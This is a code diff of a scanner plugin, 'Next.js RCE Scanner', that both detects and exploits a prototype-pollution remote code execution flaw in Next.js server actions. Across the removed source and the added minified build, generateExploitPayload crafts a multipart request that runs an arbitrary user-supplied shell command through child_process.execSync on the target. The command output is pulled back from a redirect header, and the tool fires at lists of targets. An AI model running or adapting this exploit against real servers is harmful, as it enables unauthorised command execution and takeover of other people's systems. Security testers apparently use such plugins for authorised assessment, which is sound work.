@@ -3,7 +3,7 @@
  *
  * @plugin nextjs_rce_scanner
  * @name Next.js RCE Scanner
- * @version 1.0.6
+ * @version 1.0.7
  * @author Sentinel Team
  * @main_category agent
  * @monitor_type risk
@@ -11,434 +11,121 @@
  * @target_asset_types ["web"]
  * @category exploit
  * @default_severity critical
- * @tags nextjs, rce, prototype-pollution, cve, exploit
+ * @tags nextjs, rce, prototype-pollution, cve, exploit, capability:fetch, capability:monitor-events, monitor:results-stream-v2
  * @description Detect and exploit Next.js prototype pollution RCE vulnerability
+ * @target_sources ["surface_asset","bounty_asset","scope"]
+ * @seed_bindings []
  */
-
-/**
- * Tool input parameters
- */
-interface ToolInput {
-    targets: string[];
-    command?: string;
-    detectOnly?: boolean;
-}
-
-interface ToolOutput {
-    success: boolean;
-    data?: {
-        results: Array<{
-            url: string;
-            vulnerable: boolean;
-            commandOutput?: string;
-            error?: string;
-            responseTime?: number;
-        }>;
-        summary: {
-            total: number;
-            vulnerable: number;
-            scanned: number;
-        };
-    };
-    error?: string;
-}
-
-type PluginGlobals = typeof globalThis & {
-    get_input_schema?: typeof get_input_schema;
-    get_output_schema?: typeof get_output_schema;
-    analyze?: typeof analyze;
-};
-
-const pluginGlobals = globalThis as PluginGlobals;
-
-/**
- * 【方案2】导出参数 Schema 函数
- *
- * 插件自己定义需要的参数，引擎加载后调用此函数获取。
- */
-export function get_input_schema() {
-    return {
-        type: "object",
-        required: ["targets"],
-        properties: {
-            targets: {
-                type: "array",
-                items: { type: "string" },
-                description: "目标域名或URL列表，如 ['https://example.com', 'target.com']"
-            },
-            command: {
-                type: "string",
-                description: "要执行的命令（可选，默认为 'id'）",
-                default: "id"
-            },
-            detectOnly: {
-                type: "boolean",
-                description: "是否只检测不执行命令（true=仅检测，false=执行命令）",
-                default: false
-            },
-        }
-    };
-}
-
-// 绑定到 globalThis
-pluginGlobals.get_input_schema = get_input_schema;
-
-/**
- * Export output schema
- */
-export function get_output_schema() {
-    return {
-        type: "object",
-        properties: {
-            success: { type: "boolean", description: "Whether the operation succeeded" },
-            data: {
-                type: "object",
-                properties: {
-                    results: {
-                        type: "array",
-                        items: {
-                            type: "object",
-                            properties: {
-                                url: { type: "string" },
-                                vulnerable: { type: "boolean" },
-                                commandOutput: { type: "string" }
-                            }
-                        },
-                        description: "Scan results"
-                    },
-                    summary: {
-                        type: "object",
-                        properties: {
-                            total: { type: "integer" },
-                            vulnerable: { type: "integer" },
-                            scanned: { type: "integer" }
-                        }
-                    }
-                }
-            },
-            error: { type: "string", description: "Error message if failed" }
-        }
-    };
-}
-
-pluginGlobals.get_output_schema = get_output_schema;
-
-/**
- * Generate exploit payload
- * @param command Command to execute
- * @returns Multipart/form-data request body with payload
- */
-function generateExploitPayload(command: string): string {
-    const boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad";
-
-    const payload = {
-        then: "$1:__proto__:then",
-        status: "resolved_model",
-        reason: -1,
-        value: '{"then":"$B1337"}',
-        _response: {
-            _prefix: `var res=process.mainModule.require('child_process').execSync('${command}').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),{digest: \`NEXT_REDIRECT;push;/login?a=\${res};307;\`});`,
-            _chunks: "$Q2",
-            _formData: {
-                get: "$1:constructor:constructor"
-            }
-        }
-    };
-
-    const parts = [
-        `--${boundary}`,
-        'Content-Disposition: form-data; name="0"',
-        '',
-        JSON.stringify(payload),
-        `--${boundary}`,
-        'Content-Disposition: form-data; name="1"',
-        '',
-        '"$@0"',
-        `--${boundary}`,
-        'Content-Disposition: form-data; name="2"',
-        '',
-        '[]',
-        `--${boundary}--`,
-        ''
-    ];
-
-    return parts.join('\r\n');
-}
-
-/**
- * Parse x-action-redirect header to extract command output
- */
-function parseRedirectHeader(redirectHeader: string | null): string | null {
-    if (!redirectHeader) return null;
-
-    try {
-        const match = redirectHeader.match(/\/login\?a=([^;]+)/);
-        if (match && match[1]) {
-            return decodeURIComponent(match[1].trim());
-        }
-        return null;
-    } catch {
-        return null;
-    }
-}
-
-/**
- * Parse response to extract command execution result
- */
-function parseCommandOutput(responseText: string, redirectHeader: string | null): string | null {
-    // Prefer header parsing (more reliable)
-    const headerResult = parseRedirectHeader(redirectHeader);
-    if (headerResult) {
-        return headerResult;
-    }
-
-    try {
-        // Fallback: extract from response body
-        const redirectMatch = responseText.match(/NEXT_REDIRECT;push;\/login\?a=([^;]+);307/);
-        if (redirectMatch && redirectMatch[1]) {
-            return decodeURIComponent(redirectMatch[1]);
-        }
-
-        const errorMatch = responseText.match(/digest:\s*['"]NEXT_REDIRECT;push;\/login\?a=([^'"]+)['"]/);
-        if (errorMatch && errorMatch[1]) {
-            return decodeURIComponent(errorMatch[1]);
-        }
-
-        if (responseText.includes('VULNERABLE_DETECTED')) {
-            return "VULNERABLE_DETECTED";
-        }
-
-        return null;
-    } catch {
-        return null;
-    }
-}
-
-/**
- * Check if command output indicates successful exploitation
- */
-function isExploitSuccessful(output: string | null, command: string): boolean {
-    if (!output) return false;
-
-    // id command signature detection
-    if (command === 'id' || command.includes('id')) {
-        return /uid=\d+/.test(output) || /gid=\d+/.test(output);
-    }
-
-    // whoami command signature
-    if (command === 'whoami') {
-        return output.length > 0 && !output.includes('error') && !output.includes('not found');
-    }
-
-    // General detection: has output and not an error message
-    return output.length > 0 &&
-           output !== "VULNERABLE_DETECTED" &&
-           !output.toLowerCase().includes('error') &&
-           !output.toLowerCase().includes('not found');
-}
-
-/**
- * Send exploit request
- */
-async function sendExploitRequest(
-    url: string,
-    payload: string,
-): Promise<{responseText: string; status: number; responseTime: number; redirectHeader: string | null; error?: string}> {
-    const startTime = Date.now();
-
-    try {
-        const response = await fetch(url, {
-            method: 'POST',
-            headers: {
-                'Host': new URL(url).host,
-                'Next-Action': 'x',
-                'X-Nextjs-Request-Id': 'b5dce965',
-                'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad',
-                'X-Nextjs-Html-Request-Id': 'SSTMXm7OJ_g0Ncx6jpQt9',
-                'Content-Length': payload.length.toString(),
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-            },
-            body: payload,
-            timeout: 15000,
-        });
-
-        const responseTime = Date.now() - startTime;
-        const responseText = await response.text();
-        const redirectHeader = response.headers.get('x-action-redirect');
-
-        return {
-            responseText,
-            status: response.status,
-            responseTime,
-            redirectHeader
-        };
-    } catch (error: any) {
-        const responseTime = Date.now() - startTime;
-        return {
-            responseText: '',
-            status: 0,
-            responseTime,
-            redirectHeader: null,
-            error: error.message || 'Request failed'
-        };
-    }
-}
-
-/**
- * Normalize URL, return list of URLs to test if no protocol specified
- */
-function normalizeTargetUrls(target: string): string[] {
-    const trimmed = target.trim();
-
-    if (trimmed.startsWith('http://') || trimmed.startsWith('https://')) {
-        return [trimmed];
-    }
-
-    // No protocol, test both https and http
-    return [`https://${trimmed}`, `http://${trimmed}`];
-}
-
-/**
- * Run tasks with bounded concurrency. Host enforces global direct-fetch limit.
- */
-async function runWithConcurrency<T>(tasks: (() => Promise<T>)[], concurrency: number): Promise<void> {
-    const limit = Math.max(1, Math.min(concurrency, tasks.length));
-    let nextIndex = 0;
-
-    const workers = Array.from({ length: limit }, async () => {
-        while (true) {
-            const index = nextIndex++;
-            if (index >= tasks.length) {
-                return;
-            }
-            try {
-                await tasks[index]();
-            } catch {
-                // Individual probes are best-effort; keep swallowing failures.
-            }
-        }
-    });
-
-    await Promise.all(workers);
-}
-
-/**
- * Main analysis function
- */
-export async function analyze(input: ToolInput): Promise<ToolOutput> {
-    try {
-        // Validate input
-        if (!input || !input.targets || !Array.isArray(input.targets)) {
-            return {
-                success: false,
-                error: "Invalid input: targets parameter is required and must be an array"
-            };
-        }
-
-        // Filter out empty strings
-        const validTargets = input.targets.filter(t => typeof t === 'string' && t.trim().length > 0);
-        if (validTargets.length === 0) {
-            return {
-                success: false,
-                error: "Invalid input: targets array must contain at least one non-empty string"
-            };
-        }
-
-        const targets = validTargets;
-        const command = input.command || 'id';
-        const detectOnly = input.detectOnly || false;
-
-        const results: Array<{
-            url: string;
-            vulnerable: boolean;
-            commandOutput?: string;
-            responseTime?: number;
-        }> = [];
-
-        let scannedCount = 0;
-
-        // Single target scan task
-        const scanTarget = async (target: string): Promise<void> => {
-            const urlsToTest = normalizeTargetUrls(target);
-
-            for (const targetUrl of urlsToTest) {
-                try {
-                    // Validate URL format
-                    try {
-                        new URL(targetUrl);
-                    } catch {
-                        continue;
-                    }
-
-                    scannedCount++;
-
-                    const effectiveCommand = detectOnly ? 'id' : command;
-                    const payload = generateExploitPayload(effectiveCommand);
-                    const requestResult = await sendExploitRequest(targetUrl, payload);
-
-                    if (requestResult.error) {
-                        continue;
-                    }
-
-                    const commandOutput = parseCommandOutput(requestResult.responseText, requestResult.redirectHeader);
-
-                    if (detectOnly) {
-                        const vulnerable = isExploitSuccessful(commandOutput, 'id');
-                        if (vulnerable) {
-                            results.push({
-                                url: targetUrl,
-                                vulnerable: true,
-                                commandOutput: `Vulnerability detected! Command output: ${commandOutput}`,
-                                responseTime: requestResult.responseTime
-                            });
-                            return;
-                        }
-                    } else {
-                        const vulnerable = isExploitSuccessful(commandOutput, command);
-                        if (vulnerable) {
-                            results.push({
-                                url: targetUrl,
-                                vulnerable: true,
-                                commandOutput: commandOutput || undefined,
-                                responseTime: requestResult.responseTime
-                            });
-                            return;
-                        }
-                    }
-                } catch {
-                    continue;
-                }
-            }
-        };
-
-        // Create all scan tasks
-        const tasks = targets.map(target => () => scanTarget(target));
-
-        // Execute in batches
-        await runWithConcurrency(tasks, 3);
-
-        // Generate summary
-        const summary = {
-            total: targets.length,
-            vulnerable: results.length,
-            scanned: scannedCount,
-        };
-
-        return {
-            success: true,
-            data: {
-                results,
-                summary
-            }
-        };
-
-    } catch (error: any) {
-        return {
-            success: false,
-            error: error instanceof Error ? error.message : String(error)
-        };
-    }
-}
-
-// Export to globalThis for plugin engine
-pluginGlobals.analyze = analyze;
+// Generated by scripts/build_monitor_plugins.mjs from source/agent/nextjs_rce_scanner/index.ts; edit the source modules.
+var MONITOR_DELTA_INPUT_FIELDS=["targets","target_objects","service_targets","__monitorExecution","previousSnapshots","previous_snapshots","dictionaryEntries","\
+dictionary"];function isJsonObject(value){return value!==null&&typeof value==="object"&&!Array.isArray(value)}function serializedBytes(text){let bytes=0;for(let index=0;index<
+text.length;index++){const code=text.charCodeAt(index);if(code<128)bytes++;else if(code<2048)bytes+=2;else if(code>=55296&&code<=56319){bytes+=4;index++}else bytes+=
+3}return bytes}function jsonBytes(value){return serializedBytes(JSON.stringify(value))}function objectNode(members){let bytes=2+Math.max(0,members.size-1);const entries=[];
+for(const[key,entry]of members){bytes+=entry.keyBytes+1+entry.node.bytes;entries.push([key,entry.node.value])}return{kind:"object",value:Object.fromEntries(entries),
+bytes,members}}function node(value){if(Array.isArray(value)){let bytes=2+Math.max(0,value.length-1);for(const item of value)bytes+=node(item).bytes;return{kind:"\
+array",value,bytes}}if(isJsonObject(value)){return objectNode(new Map(Object.entries(value).map(([key,value2])=>[key,{keyBytes:jsonBytes(key),node:node(value2)}])))}
+return{kind:"scalar",value,bytes:jsonBytes(value)}}function validateDeltaData(data){if(!isJsonObject(data)){throw new Error("Monitor result delta must contain s\
+uccess:true and an object data")}for(const key of MONITOR_DELTA_INPUT_FIELDS){if(Object.prototype.hasOwnProperty.call(data,key)){throw new Error(`Monitor result\
+ delta must not repeat execution input field data.${key}`)}}if(data.snapshots!==void 0&&!isJsonObject(data.snapshots)){throw new Error("Monitor snapshot delta m\
+ust be an object")}}function copyMonitorDelta(output){if(!isJsonObject(output)||output.success!==true){throw new Error("Monitor result delta must contain succes\
+s:true and an object data")}validateDeltaData(output.data);const data=JSON.parse(JSON.stringify(output.data));validateDeltaData(data);return node(data)}var EMPTY_REQUEST_BYTES=jsonBytes({sequence:0,work:[]});function monitorRequestBytes(sequence,workContentsBytes){return EMPTY_REQUEST_BYTES-1+jsonBytes(sequence)+
+workContentsBytes}var MAX_WORK_ITEMS=32;var MAX_JSON_BYTES=2*1024*1024;var COMMIT_INTERVAL_MS=5e3;function positiveLimit(value,maximum,label){if(!Number.isInteger(value)||Number(
+value)<1||Number(value)>maximum){throw new Error(`Monitor result stream ${label} must be an integer between 1 and ${maximum}`)}return Number(value)}function createMonitorResultStream(input){
+const context=isJsonObject(input)?input.__monitorExecution:void 0;if(context===void 0){return{enabled:false,assertHealthy(){},async record(_target,_key,_output,_options){},
+async finish(finalOutput){return finalOutput}}}if(!isJsonObject(context)||!isJsonObject(context.result_stream)||context.result_stream.protocol!=="monitor-result\
+s-v2"){throw new Error("Monitor execution requires the monitor-results-v2 result stream")}const monitor=globalThis.Sentinel?.Monitor;if(typeof monitor?.commitResults!==
+"function"){throw new Error("Monitor execution requires Sentinel.Monitor.commitResults")}const stream=context.result_stream;if(!Array.isArray(stream.targets)||stream.
+targets.some(target=>typeof target!=="string"||!target)){throw new Error("Monitor result stream requires the host-owned targets array")}const expected=new Set(stream.
+targets);const chunkSize=positiveLimit(stream.max_work_items,MAX_WORK_ITEMS,"max_work_items");const maxPending=positiveLimit(stream.max_pending_commits,2,"max_p\
+ending_commits");const byteLimit=positiveLimit(stream.max_bytes,MAX_JSON_BYTES,"max_bytes");const completed=new Set;const pending=new Set;const bufferedKeys=new Set;
+let buffered=[];let workContentsBytes=0;let sequence=0;let lastCommitAt=Date.now();let failed;let finished=false;let serialization=Promise.resolve();let committedItems=0;
+let submittedBatches=0;let maxPendingObserved=0;let backpressureMs=0;let submittedJsonBytes=0;let committedJsonBytes=0;let maxBatchJsonBytes=0;function assertHealthy(){
+if(failed)throw failed;if(finished)throw new Error("Monitor result stream is already finished")}function latch(error){failed||(failed=error instanceof Error?error:
+new Error(String(error)));return failed}async function capacity(){const start=Date.now();while(pending.size>=maxPending){await Promise.race(pending);if(failed)throw failed}
+backpressureMs+=Date.now()-start;if(failed)throw failed}async function flush(){assertHealthy();if(!buffered.length)return;await capacity();const request={sequence:sequence+
+1,work:buffered};const encodedBytes=monitorRequestBytes(request.sequence,workContentsBytes);if(encodedBytes>byteLimit)throw new Error("Monitor result batch exce\
+eds the JSON byte limit");sequence++;const keys=buffered.map(item=>JSON.stringify([item.target,item.key]));buffered=[];workContentsBytes=0;lastCommitAt=Date.now();
+submittedBatches++;submittedJsonBytes+=encodedBytes;maxBatchJsonBytes=Math.max(maxBatchJsonBytes,encodedBytes);let commit;commit=Promise.resolve().then(async()=>{
+const ack=await monitor.commitResults(request);if(ack?.ok!==true||ack.sequence!==request.sequence){throw new Error(`Monitor result commit ${request.sequence} wa\
+s not acknowledged`)}committedItems+=request.work.length;committedJsonBytes+=encodedBytes}).catch(error=>{latch(error)}).finally(()=>{for(const key of keys)bufferedKeys.
+delete(key);pending.delete(commit)});pending.add(commit);maxPendingObserved=Math.max(maxPendingObserved,pending.size);await capacity()}function exclusive(action){
+const operation=serialization.then(action).catch(error=>{throw latch(error)});serialization=operation.then(()=>{},()=>{});return operation}async function record(target,key,output,options={}){
+return exclusive(async()=>{assertHealthy();if(typeof target!=="string"||!expected.has(target))throw new Error("Monitor work target is not owned by this executio\
+n");if(typeof key!=="string"||!key||key.length>2048)throw new Error("Monitor work key must contain 1 to 2048 characters");if(completed.has(target))throw new Error(
+"Monitor work cannot follow a completed target");const identity=JSON.stringify([target,key]);if(bufferedKeys.has(identity))throw new Error("Monitor work repeats\
+ an unacknowledged target/key");const status=options.status??"ok";if(!["ok","failed","skipped"].includes(status))throw new Error("Invalid monitor work status");
+const delta=copyMonitorDelta(output);if(status!=="ok"&&isJsonObject(delta.value.snapshots)&&Object.keys(delta.value.snapshots).length){throw new Error("Only suc\
+cessful work may update snapshots")}if(isJsonObject(delta.value.snapshots)&&Object.keys(delta.value.snapshots).length&&options.snapshot_complete!==true){throw new Error(
+"Snapshot updates require an explicitly complete observation")}const item={target,key,status,complete:options.complete!==false,output:{success:true,data:delta.value}};
+if(options.error!==void 0)item.error=options.error;if(options.failure_category!==void 0)item.failure_category=options.failure_category;if(options.snapshot_complete!==
+void 0)item.snapshot_complete=options.snapshot_complete;const itemBytes=jsonBytes(item);if(monitorRequestBytes(sequence+1,itemBytes)>byteLimit){throw new Error(
+"A single monitor work result exceeds the JSON byte limit")}let combinedWorkBytes=workContentsBytes+(buffered.length?1:0)+itemBytes;if(buffered.length&&monitorRequestBytes(
+sequence+1,combinedWorkBytes)>byteLimit){await flush();combinedWorkBytes=itemBytes}buffered.push(item);workContentsBytes=combinedWorkBytes;bufferedKeys.add(identity);
+if(item.complete)completed.add(target);if(buffered.length>=chunkSize||Date.now()-lastCommitAt>=COMMIT_INTERVAL_MS)await flush()})}async function finish(finalOutput){
+return exclusive(async()=>{assertHealthy();await flush();await Promise.all(pending);if(failed)throw failed;const finalRecord=isJsonObject(finalOutput)?finalOutput:
+void 0;if(finalRecord?.success===false){throw new Error(typeof finalRecord.error==="string"&&finalRecord.error?finalRecord.error:"Monitor plugin reported an uns\
+uccessful execution")}if(completed.size!==expected.size){throw new Error(`Monitor result stream ended before all targets completed (${completed.size}/${expected.
+size})`)}const finalDiagnostics=finalRecord&&isJsonObject(finalRecord.data)&&isJsonObject(finalRecord.data.summary)&&isJsonObject(finalRecord.data.summary.diagnostics)?
+finalRecord.data.summary.diagnostics:{};const pluginMetrics=Object.fromEntries(Object.entries(finalDiagnostics).filter(([,value])=>typeof value==="number"&&Number.
+isFinite(value)&&value>=0));finished=true;return{success:true,data:{stream_complete:true,summary:{diagnostics:{...pluginMetrics,submitted_json_bytes:submittedJsonBytes,
+committed_json_bytes:committedJsonBytes,max_batch_json_bytes:maxBatchJsonBytes,committed_work_items:committedItems,completed_targets:completed.size,submitted_batches:submittedBatches,
+max_pending_commits:maxPendingObserved,backpressure_ms_sum:backpressureMs}}}}})}return{enabled:true,assertHealthy,record,finish}}var aliases=["targets","urls","url","domains","domain","ips","ip"];var activeScope;function observedFetch(input,init){const scope=activeScope;if(!scope)return globalThis.
+fetch(input,init);const key=`http:${++scope.sequence}`;const operation=(async()=>{scope.stream.assertHealthy();let response;try{response=await globalThis.fetch(
+input,init)}catch(error){await scope.stream.record(scope.target,key,{success:true,data:{results:[{kind:"http_observation",success:false}]}},{status:"failed",complete:false,
+error:String(error).slice(0,2048),failure_category:"network_other"});throw error}await scope.stream.record(scope.target,key,{success:true,data:{results:[{kind:"\
+http_observation",success:true,statusCode:response.status,method:String(init?.method||"GET")}]}},{complete:false});return response})();scope.pending.add(operation);
+void operation.finally(()=>scope.pending.delete(operation)).catch(()=>{});return operation}async function runMonitorTool(input,schema,business){const stream=createMonitorResultStream(
+input);if(activeScope)throw new Error("A monitored business scope is already active");if(!stream.enabled)return await business(input);try{const properties=schema?.
+properties||{};const supported=aliases.filter(key=>Object.prototype.hasOwnProperty.call(properties,key));if(!supported.length)throw new Error("Monitor business \
+schema must declare a standard target input");const targets=input.__monitorExecution.result_stream.targets;for(const target of targets){stream.assertHealthy();const ordinary={
+...input};delete ordinary.__monitorExecution;for(const key of aliases){if(!supported.includes(key))delete ordinary[key];else ordinary[key]=["url","domain","ip"].
+includes(key)?target:[target]}let result;const scope={target,stream,sequence:0,pending:new Set};activeScope=scope;try{result=await business(ordinary)}catch(error){
+result={success:false,error:error instanceof Error?error.message:String(error)}}finally{while(scope.pending.size)await Promise.allSettled([...scope.pending]);activeScope=
+void 0}stream.assertHealthy();if(!result||typeof result.success!=="boolean")throw new Error("Monitor business must return a ToolOutput");const success=result.success===
+true;const data={results:[{target,output:result}]};await stream.record(target,"complete",{success:true,data},{status:success?"ok":"failed",complete:true,snapshot_complete:success,
+...success?{}:{error:String(result.error||"Business observation failed")}})}return await stream.finish()}catch(error){const failure={success:false,error:error instanceof
+Error?error.message:String(error)};try{return await stream.finish(failure)}catch(saveError){return{success:false,error:saveError instanceof Error?saveError.message:
+String(saveError)}}}}function monitorToolOutputSchema(business){const terminalData={type:"object",required:["stream_complete","summary"],properties:{stream_complete:{
+const:true},summary:{type:"object"}}};const terminal={type:"object",required:["success","data"],properties:{success:{const:true},data:terminalData}};const failure={
+type:"object",required:["success","error"],properties:{success:{const:false},error:{type:"string",minLength:1}}};return{type:"object",required:["success"],properties:{
+success:{type:"boolean",description:"Execution outcome"},data:{type:"object",description:"Business output or acknowledged monitor completion",properties:{stream_complete:{
+type:"boolean"},summary:{type:"object"}}},error:{type:"string",description:"Execution failure"}},anyOf:[business,terminal,failure]}}var pluginGlobals=globalThis;function get_input_schema(){return{type:"object",required:["targets"],properties:{targets:{type:"array",items:{type:"string"},description:"\
+目标域名或URL列表，如 ['https://example.com', 'target.com']"},command:{type:"string",description:"要执行的命令（可选，默认为 'id'）",default:"\
+id"},detectOnly:{type:"boolean",description:"是否只检测不执行命令（true=仅检测，false=执行命令）",default:false}}}}pluginGlobals.get_input_schema=
+get_input_schema;function getBusinessOutputSchema(){return{type:"object",properties:{success:{type:"boolean",description:"Whether the operation succeeded"},data:{
+type:"object",properties:{results:{type:"array",items:{type:"object",properties:{url:{type:"string"},vulnerable:{type:"boolean"},commandOutput:{type:"string"}}},
+description:"Scan results"},summary:{type:"object",properties:{total:{type:"integer"},vulnerable:{type:"integer"},scanned:{type:"integer"}}}}},error:{type:"stri\
+ng",description:"Error message if failed"}}}}pluginGlobals.get_output_schema=get_output_schema;function generateExploitPayload(command){const boundary="----WebK\
+itFormBoundaryx8jO2oVc6SWP3Sad";const payload={then:"$1:__proto__:then",status:"resolved_model",reason:-1,value:'{"then":"$B1337"}',_response:{_prefix:`var res=\
+process.mainModule.require('child_process').execSync('${command}').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),{digest: \`NEXT_REDIRECT;pus\
+h;/login?a=\${res};307;\`});`,_chunks:"$Q2",_formData:{get:"$1:constructor:constructor"}}};const parts=[`--${boundary}`,'Content-Disposition: form-data; name="0\
+"',"",JSON.stringify(payload),`--${boundary}`,'Content-Disposition: form-data; name="1"',"",'"$@0"',`--${boundary}`,'Content-Disposition: form-data; name="2"',"",
+"[]",`--${boundary}--`,""];return parts.join("\r\n")}function parseRedirectHeader(redirectHeader){if(!redirectHeader)return null;try{const match=redirectHeader.
+match(/\/login\?a=([^;]+)/);if(match&&match[1]){return decodeURIComponent(match[1].trim())}return null}catch{return null}}function parseCommandOutput(responseText,redirectHeader){
+const headerResult=parseRedirectHeader(redirectHeader);if(headerResult){return headerResult}try{const redirectMatch=responseText.match(/NEXT_REDIRECT;push;\/login\?a=([^;]+);307/);
+if(redirectMatch&&redirectMatch[1]){return decodeURIComponent(redirectMatch[1])}const errorMatch=responseText.match(/digest:\s*['"]NEXT_REDIRECT;push;\/login\?a=([^'"]+)['"]/);
+if(errorMatch&&errorMatch[1]){return decodeURIComponent(errorMatch[1])}if(responseText.includes("VULNERABLE_DETECTED")){return"VULNERABLE_DETECTED"}return null}catch{
+return null}}function isExploitSuccessful(output,command){if(!output)return false;if(command==="id"||command.includes("id")){return/uid=\d+/.test(output)||/gid=\d+/.
+test(output)}if(command==="whoami"){return output.length>0&&!output.includes("error")&&!output.includes("not found")}return output.length>0&&output!=="VULNERABL\
+E_DETECTED"&&!output.toLowerCase().includes("error")&&!output.toLowerCase().includes("not found")}async function sendExploitRequest(url,payload){const startTime=Date.
+now();try{const response=await observedFetch(url,{method:"POST",headers:{Host:new URL(url).host,"Next-Action":"x","X-Nextjs-Request-Id":"b5dce965","Content-Type":"\
+multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad","X-Nextjs-Html-Request-Id":"SSTMXm7OJ_g0Ncx6jpQt9","Content-Length":payload.length.toString(),
+"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"},body:payload,timeout:15e3});const responseTime=Date.now()-startTime;const responseText=await response.
+text();const redirectHeader=response.headers.get("x-action-redirect");return{responseText,status:response.status,responseTime,redirectHeader}}catch(error){const responseTime=Date.
+now()-startTime;return{responseText:"",status:0,responseTime,redirectHeader:null,error:error.message||"Request failed"}}}function normalizeTargetUrls(target){const trimmed=target.
+trim();if(trimmed.startsWith("http://")||trimmed.startsWith("https://")){return[trimmed]}return[`https://${trimmed}`,`http://${trimmed}`]}async function runWithConcurrency(tasks,concurrency){
+const limit=Math.max(1,Math.min(concurrency,tasks.length));let nextIndex=0;const workers=Array.from({length:limit},async()=>{while(true){const index=nextIndex++;
+if(index>=tasks.length){return}try{await tasks[index]()}catch{}}});await Promise.all(workers)}async function analyzeBusiness(input){try{if(!input||!input.targets||
+!Array.isArray(input.targets)){return{success:false,error:"Invalid input: targets parameter is required and must be an array"}}const validTargets=input.targets.
+filter(t=>typeof t==="string"&&t.trim().length>0);if(validTargets.length===0){return{success:false,error:"Invalid input: targets array must contain at least one\
+ non-empty string"}}const targets=validTargets;const command=input.command||"id";const detectOnly=input.detectOnly||false;const results=[];let scannedCount=0;const scanTarget=async target=>{
+const urlsToTest=normalizeTargetUrls(target);for(const targetUrl of urlsToTest){try{try{new URL(targetUrl)}catch{continue}scannedCount++;const effectiveCommand=detectOnly?
+"id":command;const payload=generateExploitPayload(effectiveCommand);const requestResult=await sendExploitRequest(targetUrl,payload);if(requestResult.error){continue}
+const commandOutput=parseCommandOutput(requestResult.responseText,requestResult.redirectHeader);if(detectOnly){const vulnerable=isExploitSuccessful(commandOutput,
+"id");if(vulnerable){results.push({url:targetUrl,vulnerable:true,commandOutput:`Vulnerability detected! Command output: ${commandOutput}`,responseTime:requestResult.
+responseTime});return}}else{const vulnerable=isExploitSuccessful(commandOutput,command);if(vulnerable){results.push({url:targetUrl,vulnerable:true,commandOutput:commandOutput||
+void 0,responseTime:requestResult.responseTime});return}}}catch{continue}}};const tasks=targets.map(target=>()=>scanTarget(target));await runWithConcurrency(tasks,
+3);const summary={total:targets.length,vulnerable:results.length,scanned:scannedCount};return{success:true,data:{results,summary}}}catch(error){return{success:false,
+error:error instanceof Error?error.message:String(error)}}}pluginGlobals.analyze=analyze;function get_output_schema(){return monitorToolOutputSchema(getBusinessOutputSchema())}
+async function analyze(input){return await runMonitorTool(input,get_input_schema(),analyzeBusiness)}export{analyze,get_input_schema,get_output_schema};
+globalThis.get_input_schema=get_input_schema; globalThis.get_output_schema=get_output_schema; globalThis.analyze=analyze;
